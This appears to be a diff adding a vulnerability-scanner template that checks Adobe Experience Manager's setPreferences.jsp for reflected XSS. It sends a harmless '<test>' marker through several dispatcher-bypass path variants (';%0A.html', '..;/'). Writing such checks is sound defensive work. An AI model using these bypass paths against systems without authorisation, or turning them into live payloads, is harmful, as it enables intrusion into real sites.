@@ -1,0 +1,30 @@
+id: setPreferences 
+
+info:
+  name: setPreferences bypass Try XSS
+  author: Zin Min Phyo fb.com/zinminphy0 @zin_min_phyo
+  ref: https://www.youtube.com/watch?v=VwLSUHNhrOw&t=142s
+  severity: Medium
+  tags:  injection
+
+  
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<test>"
+      - "{{BaseURL}}/crx/nl/setPreferences.jsp;%0A.html?language=en&keymap=<test>"
+      - "{{BaseURL}}/crx/en/setPreferences.jsp;%0A.html?language=en&keymap=<test>"
+      - "{{BaseURL}}/crx/us/setPreferences.jsp;%0A.html?language=en&keymap=<test>"
+      - "{{BaseURL}}/crx/de/setPreferences.jsp;%0A.js?language=en&keymap=<test>"
+      - "{{BaseURL}}/crx/de/setPreferences.jsp?language=en&keymap=<test>"
+      - "{{BaseURL}}/content/..;/crx/de/setPreferences.jsp;%0A.js?language=en&keymap=<test>"
+      - "{{BaseURL}}/content/..;/crx/de/setPreferences.jsp?language=en&keymap=<test>"
+      - "{{BaseURL}}/content/crx/de/setPreferences.jsp;%0A.js?language=en&keymap=<test>"
+      - "{{BaseURL}}/content/crx/de/setPreferences.jsp?language=en&keymap=<test>"
+       
+    matchers:
+      - type: word
+        words:
+          - "<test>"
+        part: body
+
